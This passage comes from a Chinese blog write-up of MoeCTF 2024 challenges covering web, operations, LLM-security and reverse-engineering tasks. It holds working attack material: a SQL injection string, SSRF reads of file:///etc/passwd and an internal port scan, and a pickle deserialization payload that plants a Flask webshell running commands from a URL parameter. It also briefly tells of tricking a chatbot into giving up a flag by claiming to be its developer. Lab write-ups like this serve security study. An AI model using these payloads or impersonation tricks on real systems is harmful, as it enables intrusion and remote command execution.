class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;status&#x27;</span>)<br>    <span class="hljs-keyword">return</span> tag.text <span class="hljs-keyword">if</span> tag <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;状态未找到&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_numbers</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">int</span>(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&#x27;\d+&#x27;</span>, text)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-comment"># 提取状态文本</span><br>    status_text = extract(post_response.text)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;状态: <span class="hljs-subst">&#123;status_text&#125;</span>&quot;</span>)<br><br>    numbers = extract_numbers(status_text)<br>    count = <span class="hljs-built_in">len</span>(numbers)<br><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        ans = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;get_direction(numbers[<span class="hljs-number">0</span>])&#125;</span>&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        ans = <span class="hljs-string">&quot;，&quot;</span>.join([<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;get_direction(num)&#125;</span>一个&quot;</span> <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> numbers])<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;方向: <span class="hljs-subst">&#123;ans&#125;</span>&quot;</span>)<br><br>    payload = &#123;<span class="hljs-string">&#x27;player&#x27;</span>: <span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-string">&#x27;direct&#x27;</span>: ans&#125;<br>    post_response = session.post(url, data=payload)<br><br>    status_text = extract(post_response.text)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;新的状态: <span class="hljs-subst">&#123;status_text&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="电院_backend"><a class="markdownIt-Anchor" href="#电院_backend"></a> 电院_Backend</h2><p>过了一阵子才写，其实就是简单的sql注入，只是不怎么遇到sql的题目，所以也就不怎么会写了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">test@example.com&#x27; UNION SELECT null, null, null -- <br></code></pre></td></tr></table></figure><p>进行绕过得到flag</p><h2 id="imagecloud前置"><a class="markdownIt-Anchor" href="#imagecloud前置"></a> ImageCloud前置</h2><p>其实应该算在ssrf里面吧，利用<code>?url=file:///etc/passwd</code>,读取到flag</p><h2 id="imagecloud"><a class="markdownIt-Anchor" href="#imagecloud"></a> ImageCloud</h2><p>一开始尝试了图片一句话和vps外带执行命令，完全就是逻辑方向错了。</p><p>根据hint的提示给的是损坏的，但是容器是好的，再细看app2.py的代码（我一开始就没看</p><p>可以得出其实容器开了两个端口？利用**<code>?url=http://127.0.0.1:xxxx/image/flag.jpg</code>**，然后结合bp快速扫一下5001-6000的端口</p><p>就找到flag.jpg所在位置，图片上有flag</p><p><img src="/../../images/moectf/moectf2024/cloud.png" alt="cloud"></p><h2 id="petstore复现"><a class="markdownIt-Anchor" href="#petstore复现"></a> PetStore(复现)</h2><p>是个pickle的题目，写的时候没有往内存马那边想后来请教学长告诉了可以直接打个🐎进去，因为种种原因直到结束都没再写，复现一下。以下是一开始的个人思路。</p><p>关键的代码定位是import_pet部分的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">import_pet</span>(<span class="hljs-params">self, serialized_pet</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">try</span>:<br>        pet_data = base64.b64decode(serialized_pet)<br>        pet = pickle.loads(pet_data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(pet, Pet):<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.pets:<br>                <span class="hljs-keyword">if</span> i.uuid == pet.uuid:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-variable language_">self</span>.pets.append(pet)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">export_pet</span>(<span class="hljs-params">self, pet_uuid</span>) -&gt; <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span>:<br>    pet = <span class="hljs-variable language_">self</span>.get_pet(pet_uuid)<br>    <span class="hljs-keyword">if</span> pet <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.pets.remove(pet)<br>        serialized_pet = base64.b64encode(pickle.dumps(pet)).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        <span class="hljs-keyword">return</span> serialized_pet<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><p>要反序列化读取env得到flag，dockerfile是写在env里的，容器不出网，题目容器侧无法主动发起与外部网络的连接。</p><p>测试了正常的通过uuid收养一个新宠物正常通过然后改成<code>__reduce__</code>想读取env，但是读取不通</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pet</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, species, uuid</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.species = species<br>        <span class="hljs-variable language_">self</span>.uuid = uuid<br><span class="hljs-comment">#def __repr__(self):</span><br>    <span class="hljs-comment">#   return f&quot;Pet(name=&#123;self.name&#125;, species=&#123;self.species&#125;, uuid=&#123;self.uuid&#125;)&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&quot;env&quot;</span>,))<br>    <span class="hljs-comment">#return eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;env&#x27;)&quot;,)</span><br><br>uuid = <span class="hljs-built_in">str</span>(uuid.uuid4())<br><span class="hljs-built_in">print</span>(uuid)<br>a= pickle.dumps(pet)<br><span class="hljs-built_in">print</span>(a)<br>encoded_pet = base64.b64encode(a).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Encoded Payload: <span class="hljs-subst">&#123;encoded_pet&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>(ps:想想其实有什么空白文件把内容打印到上面也行的，还是老老实实打个内存马吧)然后是正常的推进思路打个内存马进去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pet</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        cmd_injection = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]&quot;</span><br>                      <span class="hljs-string">&quot;.before_request_funcs.setdefault(None, []).append(lambda :&quot;</span> + cmd_injection + <span class="hljs-string">&quot;)&quot;</span>,)<br><br><span class="hljs-comment"># 创建类实例并序列化为pickle，再进行base64编码</span><br>a = Pet()<br>b = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(b).decode())<br></code></pre></td></tr></table></figure><p>然后执行<code>?cmd=env</code>可以读取flag</p><h2 id="re-从零开始的-xdu-教书生活复现"><a class="markdownIt-Anchor" href="#re-从零开始的-xdu-教书生活复现"></a> Re: 从零开始的 XDU 教书生活(复现)</h2><p>困惑点在我怎么得到所有学生的学号以及密码登陆，因为是python写还需要分析加密逻辑，以及由于是动态的二维码图片，我想的是一个程序跑登陆学生，一个程序教师端登陆不断的发包请求识别下载二维码以保证图片的，可能确实是思路发散的太多了</p><p>代码思路是首先，使用老师的账号登录并获取二维码，然后退出登录。用每个学生的账号进行登录，使用事先获取的签到 URL 来完成签到。xxx需要自己填对应内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;xxx&#x27;</span><br>teacher_phone = <span class="hljs-string">&#x27;10000&#x27;</span><br>password = teacher_phone<br><br>QR_code_params = &#123;<br>    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;enc&quot;</span>: <span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;DB_STRATEGY&quot;</span>: <span class="hljs-string">&quot;PRIMARY_KEY&quot;</span>,<br>    <span class="hljs-string">&quot;STRATEGY_PARA&quot;</span>: <span class="hljs-string">&quot;id&quot;</span><br>&#125;<br><br><span class="hljs-comment"># 持续化 session</span><br>session = requests.session()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">teacher_login</span>():<br>    <span class="hljs-keyword">try</span>:<br>        response = session.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/fanyalogin&quot;</span>, data=&#123;<br>            <span class="hljs-string">&quot;uname&quot;</span>: teacher_phone,<br>            <span class="hljs-string">&quot;password&quot;</span>: password<br>        &#125;)<br>        response_data = response.json()<br>        <span class="hljs-keyword">if</span> response_data.get(<span class="hljs-string">&#x27;status&#x27;</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Teacher logged in successfully.&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Teacher login failed.&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error during teacher login: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">raise</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_student_account</span>():<br>    <span class="hljs-keyword">try</span>:<br>        response = session.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/widget/sign/pcTeaSignController/showSignInfo1&quot;</span>)<br>        students = response.json().get(<span class="hljs-string">&quot;data&quot;</span>, &#123;&#125;).get(<span class="hljs-string">&quot;changeUnSignList&quot;</span>, [])<br>        <span class="hljs-keyword">return</span> [student[<span class="hljs-string">&quot;uid&quot;</span>] <span class="hljs-keyword">for</span> student <span class="hljs-keyword">in</span> students]<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error fetching student account: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> []<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">student_login</span>(<span class="hljs-params">phone</span>):<br>    <span class="hljs-keyword">try</span>:<br>        response = session.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/fanyalogin&quot;</span>, data=&#123;<br>            <span class="hljs-string">&quot;uname&quot;</span>: <span class="hljs-built_in">str</span>(phone),<br>            <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-built_in">str</span>(phone)<br>        &#125;)<br>        <span class="hljs-keyword">return</span> response.json().get(<span class="hljs-string">&#x27;status&#x27;</span>, <span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error during student login for <span class="hljs-subst">&#123;phone&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_QR</span>():<br>    <span class="hljs-keyword">try</span>:<br>        response = session.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/widget/sign/e&quot;</span>, params=QR_code_params)<br>        <span class="hljs-keyword">return</span> response.text<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error scanning QR code: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    teacher_login()<br>    student_phones = get_student_account()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> student_phones:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No students to process.&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    successful_sign_ins = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> index, phone <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(student_phones, start=<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Processing student <span class="hljs-subst">&#123;phone&#125;</span> (#<span class="hljs-subst">&#123;index&#125;</span>)...&quot;</span>)<br>        <span class="hljs-keyword">if</span> student_login(phone):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Student <span class="hljs-subst">&#123;phone&#125;</span> logged in successfully.&quot;</span>)<br>            result = scan_QR()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Scan result for student <span class="hljs-subst">&#123;phone&#125;</span>: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;签到成功&quot;</span> <span class="hljs-keyword">in</span> result:<br>                successful_sign_ins += <span class="hljs-number">1</span><br>            <span class="hljs-comment"># Clear session cookies to prevent carry-over issues</span><br>            session.cookies.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Student <span class="hljs-subst">&#123;phone&#125;</span> login failed.&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;All students processed. Total successful sign-ins: <span class="hljs-subst">&#123;successful_sign_ins&#125;</span>.&quot;</span>)<br>    <span class="hljs-keyword">if</span> successful_sign_ins == <span class="hljs-built_in">len</span>(student_phones):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;All students have signed in successfully.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(student_phones) - successful_sign_ins&#125;</span> students failed to sign in.&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><h2 id="smbms复现"><a class="markdownIt-Anchor" href="#smbms复现"></a> smbms(复现)</h2><p>这题没看，做起来其实主要就是sql这边的注入慢慢的调试吧默认是admin然后bp来fuzz一下密码，得到1234567</p><p>然后就是慢慢调试sqlmap了，最后的命令如图</p><p><img src="/../../images/moectf/moectf2024/sms.png" alt="sms"></p><h1 id="开发与运维基础"><a class="markdownIt-Anchor" href="#开发与运维基础"></a> 开发与运维基础</h1><h2 id="运维入门指北"><a class="markdownIt-Anchor" href="#运维入门指北"></a> 运维入门指北</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -name <span class="hljs-string">&quot;*.bak&quot;</span> -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> -f &#123;&#125; +<br>find . -name <span class="hljs-string">&quot;*.xml&quot;</span> -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> sh -c <span class="hljs-string">&#x27;for file; do mv -- &quot;$file&quot; &quot;$&#123;file%.xml&#125;.html&quot;; done&#x27;</span> _ &#123;&#125; +<br>find . -<span class="hljs-built_in">type</span> f | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> -r file; <span class="hljs-keyword">do</span> filename=$(<span class="hljs-built_in">basename</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span>); dir1=<span class="hljs-variable">$&#123;filename:0:2&#125;</span>; dir2=<span class="hljs-variable">$&#123;filename:2:2&#125;</span>; <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$dir1</span>/<span class="hljs-variable">$dir2</span>&quot;</span>; <span class="hljs-built_in">mv</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$dir1</span>/<span class="hljs-variable">$dir2</span>/<span class="hljs-variable">$filename</span>&quot;</span>; <span class="hljs-keyword">done</span><br>su toor<br><span class="hljs-built_in">mv</span> * /var/www/html/<br>grep <span class="hljs-string">&#x27;flag&#x27;</span> /var/log/nginx/access.log<br></code></pre></td></tr></table></figure><h2 id="哦不我的libc"><a class="markdownIt-Anchor" href="#哦不我的libc"></a> 哦不！我的libc！</h2><p>用xshell进行连接，简单测试一下常规的语句都不能用了</p><p>使用Shell 内建命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r line; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span>; <span class="hljs-keyword">done</span> &lt; /flag.txt<br></code></pre></td></tr></table></figure><p>得到flag</p><h1 id="大语言模型应用安全"><a class="markdownIt-Anchor" href="#大语言模型应用安全"></a> 大语言模型应用安全</h1><h2 id="neuro"><a class="markdownIt-Anchor" href="#neuro"></a> Neuro?</h2><p>先我是vedal回答，然后告诉他亲自好像（二次认证好像,不太记得了</p><h2 id="并非助手"><a class="markdownIt-Anchor" href="#并非助手"></a> 并非助手</h2><p>尝试了一会正常的是不能输入的，表情包可以，联想到flag就是旗子，输入🚩得到flag</p><h1 id="逆向工程"><a class="markdownIt-Anchor" href="#逆向工程"></a> 逆向工程</h1><h2 id="逆向工程入门指北"><a class="markdownIt-Anchor" href="#逆向工程入门指北"></a> 逆向工程入门指北</h2><p>代码放在c环境里面运行就行</p><h2 id="xor"><a class="markdownIt-Anchor" href="#xor"></a> xor</h2><p>进行简单的异或就行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">ls=[<span class="hljs-number">0x49</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x46</span>,<span class="hljs-number">0x10</span>, <span class="hljs-number">0x13</span>,<br><span class="hljs-number">0x1C</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0x10</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x42</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x15</span>,<br><span class="hljs-number">0x14</span>,<span class="hljs-number">0x14</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x14</span>,<span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>,<span class="hljs-number">0x40</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x40</span>,<br><span class="hljs-number">0x14</span>, <span class="hljs-number">0x59</span>]<br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">for i in ls:</span><br><span class="hljs-string">s+=chr(i^0x24)</span><br><span class="hljs-string">print(s)</span><br></code></pre></td></tr></table></figure><h2 id="tea"><a class="markdownIt-Anchor" href="#tea"></a> TEA</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> &amp;v4, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> &amp;v5)</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> delta = <span class="hljs-number">0x9E3779B9</span>;  <span class="hljs-comment">// 固定值 1640531527</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3 = delta * <span class="hljs-number">32</span>;     <span class="hljs-comment">// 反向过程从最大值开始</span><br>    <span class="hljs-type">int</span> v6 = <span class="hljs-number">32</span>;<br><br>    <span class="hljs-keyword">while</span> (v6 &gt; <span class="hljs-number">0</span>) &#123;<br>        v5 -= ((v4 + v3) ^ ((v4 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-number">1634038898</span>)) ^ ((v4 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1634038904</span>);<br>        v4 -= ((v5 + v3) ^ ((v5 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-number">1702060386</span>)) ^ ((v5 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1870148662</span>);<br>        v3 -= delta;  <span class="hljs-comment">// 解密时减少 delta</span><br>        v6--;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4 = <span class="hljs-number">676078132</span>;  <span class="hljs-comment">// xxxxxxxx 部分解密后的值</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5 = <span class="hljs-number">957400408</span>;  <span class="hljs-comment">// zzzz 和 yyyy 部分解密后的值</span><br><br>    <span class="hljs-comment">// 调用解密函数</span><br>    <span class="hljs-built_in">decrypt</span>(v4, v5);<br><br>    <span class="hljs-comment">// 提取出 yyyy 和 zzzz 部分</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v11 = (v5 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span>;  <span class="hljs-comment">// yyyy 部分</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v9 = v5 &amp; <span class="hljs-number">0xFFFF</span>;           <span class="hljs-comment">// zzzz 部分</span><br><br>    <span class="hljs-comment">// 输出结果</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;xxxxxxxx = &quot;</span> &lt;&lt; std::hex &lt;&lt; v4 &lt;&lt; std::endl;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;yyyy = &quot;</span> &lt;&lt; std::hex &lt;&lt; v11 &lt;&lt; std::endl;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;zzzz = &quot;</span> &lt;&lt; std::hex &lt;&lt; v9 &lt;&lt; std::endl;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;moectf&#123;&quot;</span> &lt;&lt; std::hex &lt;&lt; v4 &lt;&lt; <span class="hljs-string">&quot;-&quot;</span> &lt;&lt; v11 &lt;&lt; <span class="hljs-string">&quot;-&quot;</span> &lt;&lt; v9 &lt;&lt; <span class="hljs-string">&quot;-9c42-caf30620caaf&#125;&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="upx"><a class="markdownIt-Anchor" href="#upx"></a> 